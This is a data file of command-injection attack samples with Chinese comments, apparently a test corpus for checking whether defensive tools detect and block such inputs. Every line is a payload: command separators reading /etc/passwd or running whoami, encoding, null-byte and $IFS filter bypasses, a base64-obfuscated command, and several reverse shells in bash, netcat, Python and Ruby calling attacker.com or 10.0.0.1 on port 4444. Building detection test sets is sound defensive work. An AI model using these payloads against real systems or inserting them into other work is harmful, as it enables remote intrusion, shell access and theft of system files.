# 命令注入攻击样本
# 期望: 防御工具应能检测并拦截包含系统命令执行特征的输入

# ---- 基础命令分隔符 ----
; cat /etc/passwd
; whoami
; id
| whoami
|| whoami
&& whoami
`whoami`
$(whoami)

# ---- 编码绕过 ----
%3B%20cat%20%2Fetc%2Fpasswd
%7C%20whoami
%26%26%20id

# ---- 空字节截断 ----
file.txt%00|whoami
image.jpg\x00;nc -e /bin/sh attacker.com 4444

# ---- 反引号与 $() ----
`nc -e /bin/sh attacker.com 4444`
$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)
$(python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')

# ---- 空格绕过 ----
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# ---- 路径遍历 + 命令注入 ----
../../../etc/passwd; whoami
../../../bin/bash -c "cat /etc/passwd"

# ---- 利用环境变量 ----
${PATH:0:1}etc${PATH:0:1}passwd
`echo${IFS}cGF0aA==|base64${IFS}-d`

# ---- 常用反弹 shell ----
; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
; nc -e /bin/sh 10.0.0.1 4444
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
